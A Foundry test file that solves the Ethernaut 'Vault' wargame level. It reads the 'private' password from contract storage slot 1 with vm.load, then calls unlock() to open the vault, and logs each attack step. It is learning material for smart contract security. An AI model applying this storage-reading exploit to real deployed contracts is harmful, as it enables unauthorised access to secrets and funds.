// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/08-Vault/VaultFactory.sol";
import "src/core/Ethernaut.sol";

contract VaultTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Vault level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testVaultExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        VaultFactory vaultFactory = new VaultFactory();

        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault vaultContract = Vault(payable(levelAddress));

        emit log_named_address(
            "Address of the exploit contract: ",
            address(this)
        );
        emit log_named_address("Attacker's address: ", address(attacker));

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("Starting the exploit...");
        emit log_string(
            "Attacker reads the password from the storage slot number 1..."
        );

        bytes32 passwordFromStorage = vm.load(
            address(vaultContract),
            bytes32(uint256(1))
        );
        emit log_named_bytes32("Password in bytes32: ", passwordFromStorage);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("Converting password to human-readable form...");
        string memory passwordConverted = string(
            abi.encodePacked(passwordFromStorage)
        );
        emit log_named_string(
            "Password converted to string: ",
            passwordConverted
        );

        //Attacker performs a call to read the password from the storage.
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string(
            "Attacker calls the unlock function with the aquired password..."
        );

        // Attacker can now make a call to the `unlock()` function passing the password as the argument.
        (bool success, ) = address(vaultContract).call(
            abi.encodeWithSignature("unlock(bytes32)", passwordFromStorage)
        );
        require(success, "Transaction failed");

        emit log_string("Vault lock cracked...");

        // Test assertion
        assertEq(vaultContract.locked(), false);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
